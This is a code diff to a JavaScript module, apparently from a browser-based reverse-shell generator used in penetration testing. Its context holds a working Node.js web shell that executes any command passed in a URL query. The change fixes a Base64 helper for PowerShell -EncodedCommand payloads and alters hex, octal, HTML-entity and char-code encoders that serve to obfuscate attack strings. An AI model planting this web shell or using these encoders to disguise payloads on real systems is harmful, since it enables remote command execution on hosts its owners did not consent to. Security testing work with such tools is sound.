@@ -177,7 +177,15 @@ const RS_WEB_SHELLS = [
   { lang: 'Node.js', cmd: `require('http').createServer(function(req,res){\n  require('child_process').exec(\n    require('url').parse(req.url,true).query.cmd,\n    function(e,so,se){res.end(so)}\n  );\n}).listen(8080);` },
 ];
 
-function btoa(s) { return `<BASE64_ENCODE>`; }
+// PowerShell -EncodedCommand expects Base64 of the UTF-16LE bytes of the script.
+function btoa(s) {
+  let bin = "";
+  for (let i = 0; i < s.length; i++) {
+    const cu = s.charCodeAt(i);
+    bin += String.fromCharCode(cu & 0xff, (cu >> 8) & 0xff);
+  }
+  return window.btoa(bin);
+}
 
 export function renderReverseShell(container) {
   let ip = '10.10.10.1', port = '4444', filter = '', activeTab = 'generator';
@@ -557,14 +565,14 @@ export function renderReverseShell(container) {
       { label: 'Base64 Decode', fn: s => { try { return window.atob(s); } catch { return 'Error: invalid base64'; } } },
       { label: 'URL Encode', fn: s => encodeURIComponent(s) },
       { label: 'URL Decode', fn: s => { try { return decodeURIComponent(s); } catch { return 'Error: invalid URL encoding'; } } },
-      { label: 'Hex Encode', fn: s => Array.from(s).map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('') },
-      { label: 'Unicode Escape', fn: s => Array.from(s).map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('') },
+      { label: 'Hex Encode', fn: s => Array.from(new TextEncoder().encode(s)).map(b => '\\x' + b.toString(16).padStart(2, '0')).join('') },
+      { label: 'Unicode Escape', fn: s => s.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('') },
       { label: 'Double URL', fn: s => encodeURIComponent(encodeURIComponent(s)) },
-      { label: 'HTML Entities', fn: s => Array.from(s).map(c => `&#${c.charCodeAt(0)};`).join('') },
-      { label: 'Octal', fn: s => Array.from(s).map(c => '\\' + c.charCodeAt(0).toString(8).padStart(3, '0')).join('') },
+      { label: 'HTML Entities', fn: s => Array.from(s).map(c => `&#${c.codePointAt(0)};`).join('') },
+      { label: 'Octal', fn: s => Array.from(new TextEncoder().encode(s)).map(b => '\\' + b.toString(8).padStart(3, '0')).join('') },
       { label: 'ROT13', fn: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13))) },
       { label: 'Reverse', fn: s => Array.from(s).reverse().join('') },
-      { label: 'Char Codes', fn: s => Array.from(s).map(c => c.charCodeAt(0)).join(',') },
+      { label: 'Char Codes', fn: s => Array.from(s).map(c => c.codePointAt(0)).join(',') },
     ];
 
     encoders.forEach(enc => {
